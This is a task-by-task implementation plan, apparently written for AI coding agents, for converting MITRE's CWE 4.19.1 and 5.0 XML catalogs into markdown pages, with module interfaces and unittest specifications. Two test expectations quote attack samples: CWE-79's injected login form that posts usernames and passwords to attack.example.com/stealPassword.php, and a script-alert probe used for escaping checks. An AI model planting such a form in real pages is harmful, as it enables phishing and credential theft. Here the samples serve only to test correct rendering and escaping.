# CWE Markdown and CWE 5.0 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Render MITRE's CWE 4.19.1 and 5.0 XML as markdown (index, one page per weakness, category/grouping and view), and add CWE 5.0 as a full edition.

**Architecture:** Three standard-library modules under `weakness/mitre.org/cwe/scripts/`: `cwe_xml.py` loads and verifies an edition's XML zip and builds view outlines; `cwe_structured_text.py` turns MITRE's XHTML structured text into markdown in document order; `cwe_to_markdown.py` renders pages and writes or checks `<edition>/markdown/`. Task 1 adds the 5.0 edition's data files independently.

**Tech Stack:** Python 3.10+ standard library (`xml.etree.ElementTree`, `zipfile`, `hashlib`, `unittest`); `yq` v4 for the per-view JSON (existing download script).

**Spec:** `docs/superpowers/specs/2026-11-18-cwe-markdown-design.md`

## Global Constraints

- Standard library only; no pip installs. Tests use `unittest`, run as `python3 -m unittest discover -s weakness/mitre.org/cwe/scripts/tests -v` from the repo root.
- Do not edit `weakness/mitre.org/cwe/scripts/download-cwe-items.sh`, `download-cwe-documents.sh` or `html_to_markdown.py`: the tier gate pins them by SHA-256.
- Inputs: `weakness/mitre.org/cwe/<ver>/cwec_v<ver>.xml.zip` (git-ignored, already present) and its committed sidecar `cwec_v<ver>.xml.zip-file-metadata.json` (`sha256` field). 4.19.1 sha256 `61e08a4e9298ba77f2213f6d467ff00557b90d11f37ecf710204237339d9c68f`; 5.0 sha256 `bcda44c9abf61ff977f50c3c6649eea5a97a7b0626b0396c2c3ec4bfb973a3dc`.
- Generated files: UTF-8, LF, trailing newline, no timestamps, no absolute local paths, numeric ID order.
- Page footer text is fixed by the spec (§Entry pages). The licence URL is `https://github.com/CloudSecurityAlliance-DataSets/dataset-public-laws-regulations-standards/blob/main/weakness/mitre.org/cwe/<ver>/LICENSE.txt`.
- No person names from `Content_History` in any generated file.
- Do not run `git commit`; the controller commits after review. Do not touch files outside your task's list.

## Review Focus

1. Prose containing markdown- or HTML-significant text (`<script>`, `|` in table cells, a line starting `#` or `>`) must render as written, not as markup. Owner: Task 2 (`test_escaping`).
2. Code containing backtick runs, tabs or `<`: preserved exactly inside a fence that is longer than any backtick run in it. Owner: Task 2 (`test_fence_longer_than_backticks`).
3. A relationship or member pointing at a view, a category/grouping, or an ID absent from the edition: links to the right folder or renders as plain text, never a dangling link. Owner: Task 4 (`test_all_relative_links_resolve`).
4. An entry with several parents in one view, or none marked `Primary`: expanded exactly once, cross-referenced elsewhere. Owner: Task 3 (`test_outline_expands_each_entry_once`).
5. Schema drift in a future release (a new XHTML tag, an unknown implicit-view filter): fails with the entry ID, or states "members not computed". Owners: Task 2 (`test_unknown_tag_fails`), Task 3 (`test_unknown_filter_returns_none`).

---

### Task 1: CWE 5.0 edition data, merge script, metadata

**Files:**
- Move: `weakness/mitre.org/cwe/4.19.1/merge_cwe_views.py` → `weakness/mitre.org/cwe/scripts/merge_cwe_views.py` (`git mv`)
- Create in `weakness/mitre.org/cwe/5.0/`: `CWE-Research-Concepts-1000.{csv,json}`, `CWE-Software-Development-699.{csv,json}`, `CWE-Hardware-Design-1194.{csv,json}`, `cwe-5.0-all.{csv,json}`, `LICENSE.txt`, `cwe-5.0-metadata.json`
- Modify: `weakness/mitre.org/cwe/4.19.1/cwe-4.19.1-metadata.json`

**Interfaces:**
- Produces: `merge_cwe_views.py --edition-dir DIR --version V` writes `DIR/cwe-V-all.{csv,json}` and prints the same summary as today.

- [ ] **Step 1:** Record `shasum -a 256 weakness/mitre.org/cwe/4.19.1/cwe-4.19.1-all.{csv,json}`.
- [ ] **Step 2:** `git mv` the script to `scripts/`; replace the cwd-relative file names and the hard-coded `cwe-4.19.1-all` with `--edition-dir` / `--version` (argparse). Keep column set and output format unchanged.
- [ ] **Step 3:** Run it for 4.19.1. Expected: both SHA-256 values equal Step 1's (byte-identical).
- [ ] **Step 4:** `cd weakness/mitre.org/cwe/5.0 && bash ../scripts/download-cwe-items.sh`. Expected: three CSVs (956 / 405 / 112 data rows for 1000 / 699 / 1194) and three JSON files whose `.Weakness_Catalog."+@Version"` is `5.0`; no zips or raw XML left behind except `cwec_v5.0.xml.zip`.
- [ ] **Step 5:** Run the merge for 5.0; record its printed counts.
- [ ] **Step 6:** Fetch `https://cwe.mitre.org/about/termsofuse.html`, produce `5.0/LICENSE.txt` in the same format as 4.19.1's, and diff the two. Report any difference.
- [ ] **Step 7:** Write `cwe-5.0-metadata.json` from 4.19.1's, per spec §Adding CWE 5.0 step 5. Values: `secid` `secid:weakness/mitre.org/cwe@5.0`, `version` `5.0`, `publication_id` `CWE-5.0`, `lifecycle.published` `2026-10-28`, `lifecycle.supersedes` naming 4.19.1 (held) and 4.20/4.21 (not held), `access_tier` 2 with `tier_evidence` in the shape METADATA-SCHEMA.md §Access tier and evidence requires (url `https://cwe.mitre.org/data/downloads.html`, checked `2026-11-18`), `scope` counts from Step 5 and from the XML (984 weaknesses, 28 deprecated, 431 groupings, 62 views, 1,081 external references), `current_extraction.tool` naming `scripts/download-cwe-items.sh`, `scripts/merge_cwe_views.py` and `scripts/cwe_to_markdown.py`, notes on the `yq` limitation, the file-name continuity (view 1000 is "Complete Weakness Hierarchy" in 5.0), and that MITRE's REST API serves latest content only (reports 4.21).
- [ ] **Step 8:** Edit 4.19.1's metadata: `lifecycle.published` `2026-01-21`, `lifecycle.supersededBy` `5.0`, `current_extraction.tool` path to `scripts/merge_cwe_views.py`, add the `yq` and markdown notes. Do not add `access_tier` to 4.19.1.
- [ ] **Step 9:** Run `python3 tools-resources/utils/audit_secid_alignment.py` and `python3 -I tools-resources/utils/check_tier_restrictions.py` (after `git add -N` of new files). Expected: both pass.

### Task 2: Structured text to markdown

**Files:**
- Create: `weakness/mitre.org/cwe/scripts/cwe_structured_text.py`
- Test: `weakness/mitre.org/cwe/scripts/tests/test_cwe_structured_text.py`

**Interfaces:**
- Produces:
  - `class UnsupportedMarkupError(ValueError)`
  - `structured_text_to_md(elem: Element, context: str) -> str`: converts the text and children of any CWE Structured_Text element (Extended_Description, Background_Detail, Note, Mitigation Description, Technical_Nuance, Intro_Text, Body_Text, Summary, Objective, …) to markdown blocks separated by one blank line; `context` (e.g. `"CWE-79/Extended_Description"`) appears in errors.
  - `example_code_to_md(elem: Element, context: str) -> str`: one `Example_Code` element to a label line `*Example (Bad, PHP):*` (Nature, then Language when present) plus a fenced block tagged with the lower-cased language.
  - `escape_inline(text: str) -> str`, `escape_table_cell(text: str) -> str`, `fence(code: str, lang: str) -> str`.
- Elements are matched by local name; XHTML elements are in namespace `http://www.w3.org/1999/xhtml`.

- [ ] **Step 1: Write failing tests**
  - `test_paragraphs_and_lists_keep_order`: `<Extended_Description>` with text, `p`, `ul/li`×2, `p` → blocks in that order; list items as `- item`.
  - `test_cwe79_result_example_order`: load `Demonstrative_Examples` of CWE-79 from `4.19.1/cwec_v4.19.1.xml.zip` with `zipfile` + `ElementTree` directly (do not import `cwe_xml`, which Task 3 builds in parallel); the `Example_Code` with `Nature="Result"` renders exactly these lines (4 spaces per nested `div` with a `margin-left` style):
    ```
    <div class="header"> Welcome, <div id="stealPassword"> Please Login:
        <form name="input" action="attack.example.com/stealPassword.php" method="post">
            Username: <input type="text" name="username" /><br/>
            Password: <input type="password" name="password" /><br/>
            <input type="submit" value="Login" />
        </form>
    </div></div>
    ```
  - `test_escaping`: `escape_inline("<script>alert(1)</script>")` contains no raw `<`; `escape_inline("# not a heading")` does not start with `#`; `escape_table_cell("a|b\nc")` has no unescaped `|` and no newline.
  - `test_fence_longer_than_backticks`: code containing ```` ``` ```` gets a fence of at least four backticks; tabs survive.
  - `test_table_converts`: an XHTML `table` with `th`/`td` becomes a markdown table with the header row first.
  - `test_unknown_tag_fails`: an element containing `<xhtml:blink>` raises `UnsupportedMarkupError` whose message includes the context.
  - `test_all_structured_text_in_both_editions_converts`: every structured-text element in both zips converts without error (iterate weaknesses, categories/groupings, views).
- [ ] **Step 2:** Run tests; expected FAIL (module missing).
- [ ] **Step 3:** Implement. Walk `elem.text`, children, `child.tail` in order. Prose collapses XML formatting whitespace; code preserves line content, uses `br` as a newline and strips the XML pretty-print whitespace around text segments. Supported tags: `p div br ul ol li b i table tbody tr th td caption img sup span`; `img` becomes `![alt](src)` with `src` made absolute against `https://cwe.mitre.org/data/definitions/`; `b`/`i` become `**`/`*` outside code and plain text inside code.
- [ ] **Step 4:** Run tests; expected PASS.

### Task 3: Edition loader and view outlines

**Files:**
- Create: `weakness/mitre.org/cwe/scripts/cwe_xml.py`
- Test: `weakness/mitre.org/cwe/scripts/tests/test_cwe_xml.py`

**Interfaces:**
- Produces:
  - `class SourceVerificationError(ValueError)`
  - `@dataclass(frozen=True) class Edition`: `version: str`, `date: str`, `schema_major: int` (7 or 8), `edition_dir: Path`, `zip_name: str`, `sha256: str`, `weaknesses: dict[int, Element]`, `groups: dict[int, Element]`, `views: dict[int, Element]`, `references: dict[str, Element]` (by `External_Reference_ID`), `group_term: str` (`"Category"` or `"Grouping"`), `group_dir: str` (`"categories"` or `"groupings"`).
  - `load_edition(edition_dir: Path, version: str) -> Edition`: reads the sidecar, verifies SHA-256 and `Weakness_Catalog/@Version`, parses the single XML member of the zip.
  - `local(tag: str) -> str`; `child(elem, name) -> Element | None`; `children(elem, name) -> list[Element]`; `text(elem) -> str` (stripped; `""` for `None`): all by local name.
  - `entry_kind(ed, cwe_id: int) -> str | None` → `"weakness" | "category" | "grouping" | "view"`; `entry_name(ed, cwe_id: int) -> str | None`; `entry_path(ed, cwe_id: int) -> str | None` → e.g. `"weaknesses/CWE-79.md"`, `"groupings/CWE-1006.md"`, `"views/CWE-1000.md"`.
  - `@dataclass(frozen=True) class OutlineNode`: `cwe_id: int`, `expanded: bool`, `children: tuple[OutlineNode, ...]` (empty when not expanded).
  - `view_outline(ed, view_id: int) -> tuple[OutlineNode, ...]` for Graph views (algorithm in spec §View pages); `explicit_members(ed, view_id: int) -> list[int]`; `implicit_members(ed, view_id: int) -> list[int] | None` (`None` when the filter string is not in `IMPLICIT_FILTERS`).
  - `IMPLICIT_FILTERS: dict[str, Callable[[Edition], list[int]]]`, keyed by the exact `Filter` text of the 15 active implicit views (list in the spec; read them from the XML).

- [ ] **Step 1: Write failing tests**
  - `test_load_counts`: 4.19.1 → 969 weaknesses, 420 groups, 58 views, 1,012 references, `group_term == "Category"`, `schema_major == 7`; 5.0 → 984, 431, 62, 1,081, `"Grouping"`, 8.
  - `test_sha_mismatch_raises` and `test_version_mismatch_raises`: copy the edition directory's sidecar and a symlink-free copy of the zip into a `tempfile.TemporaryDirectory`, alter the sidecar sha (or pass version `"9.9"`), expect `SourceVerificationError`.
  - `test_outline_expands_each_entry_once`: for every Graph view in both editions, each reachable entry has exactly one `expanded=True` node; for view 1000 the expanded set equals all non-deprecated weaknesses (944 / 956) and the roots are the 10 Pillars.
  - `test_view_699_roots_are_groups`: 4.19.1 view 699 has 40 roots, all categories.
  - `test_implicit_658_is_c`: every member of view 658 has `Applicable_Platforms/Language/@Name == "C"`, and the list is non-empty.
  - `test_implicit_604_is_deprecated`: view 604's members are exactly the entries with `@Status == "Deprecated"` across weaknesses, groups and views.
  - `test_unknown_filter_returns_none`: with a view whose filter text is altered, `implicit_members` returns `None`.
- [ ] **Step 2:** Run tests; expected FAIL.
- [ ] **Step 3:** Implement. Guard outline construction against cycles with a visited set; parent choice per spec (Primary ordinal in that view, else lowest parent ID).
- [ ] **Step 4:** Run tests; expected PASS.

### Task 4: Page rendering, CLI, generated markdown

**Files:**
- Create: `weakness/mitre.org/cwe/scripts/cwe_to_markdown.py`
- Test: `weakness/mitre.org/cwe/scripts/tests/test_cwe_to_markdown.py`
- Generate: `weakness/mitre.org/cwe/4.19.1/markdown/**`, `weakness/mitre.org/cwe/5.0/markdown/**`
- Modify: `weakness/mitre.org/cwe/README.md` (add a "Markdown" section: folders, versions, how to regenerate, what is omitted)

**Interfaces:**
- Consumes: Task 2's functions; Task 3's `Edition`, `load_edition`, accessors, outlines.
- Produces: `render_weakness(ed, elem) -> str`, `render_group(ed, elem) -> str`, `render_view(ed, elem) -> str`, `render_index(ed) -> str`, `render_edition(ed) -> dict[str, str]` (path relative to `markdown/` → text, including `LICENSE.txt` copied from the edition dir), `write_markdown(files, out_dir: Path) -> None` (writes all, deletes files under `out_dir` not in `files`), `diff_markdown(files, out_dir: Path) -> list[str]` (sorted relative paths that differ, are missing or are extra), `main(argv: list[str] | None = None) -> int` (`--version V [--check]`; edition dir is the script's `../<V>`).

- [ ] **Step 1: Write failing tests** (render each edition once per test module, in `setUpModule`)
  - `test_front_matter_cwe79`: 5.0 page starts with the spec's front-matter block for CWE-79, values exact (`mapping_usage` from the XML).
  - `test_section_order`: the `## ` headings of CWE-79 appear in spec order; no heading has an empty body.
  - `test_new_5_0_sections`: 5.0 CWE-1039 has `## Technical Nuance`; 5.0 CWE-1024 has `## Dimensions`; neither heading exists in any 4.19.1 page.
  - `test_footer_on_every_page`: every `.md` file ends with the spec's three footer lines for its edition.
  - `test_all_relative_links_resolve`: every `](relative)` link in every page resolves to a key of `render_edition`'s result.
  - `test_counts`: number of `weaknesses/`, group-folder and `views/` pages equals the catalog counts; the index's weakness table has that many rows.
  - `test_no_content_history_names`: for 20 weaknesses, no `Submission_Name`, `Modification_Name` or `Contribution_Name` value appears in any page, and no page has a `Content History` heading.
  - `test_deterministic`: `render_edition` twice gives equal dicts.
  - `test_check_mode`: write to a temp dir, `diff_markdown` is empty; edit one file and add one stray file, both are reported.
- [ ] **Step 2:** Run tests; expected FAIL.
- [ ] **Step 3:** Implement per spec §Entry pages, §View pages, §Index page.
- [ ] **Step 4:** Run tests; expected PASS.
- [ ] **Step 5:** Generate: `python3 weakness/mitre.org/cwe/scripts/cwe_to_markdown.py --version 4.19.1` and `--version 5.0`, then both again with `--check`. Expected: `--check` exits 0. Report file counts and `du -sh` of each `markdown/`.
- [ ] **Step 6:** Spot-check the pages listed in spec §Verification against `https://cwe.mitre.org/data/definitions/<id>.html`; report any difference in content (not layout).
- [ ] **Step 7:** Run the whole test suite and `python3 -I tools-resources/utils/check_tier_restrictions.py` (after `git add -N`). Expected: all pass.

### Controller finish (after all tasks are reviewed)

- [ ] Regenerate `INDEX.md` (`build_index.py`); run `audit_secid_alignment.py` and `check_tier_restrictions.py`.
- [ ] `sync_originals_to_s3.sh --dry-run`, then the real sync for the two zips.
- [ ] Whole-branch review on the strongest model; fix findings.
- [ ] PR with `Closes #160`, sizes, counts, verification results; resumption summary.
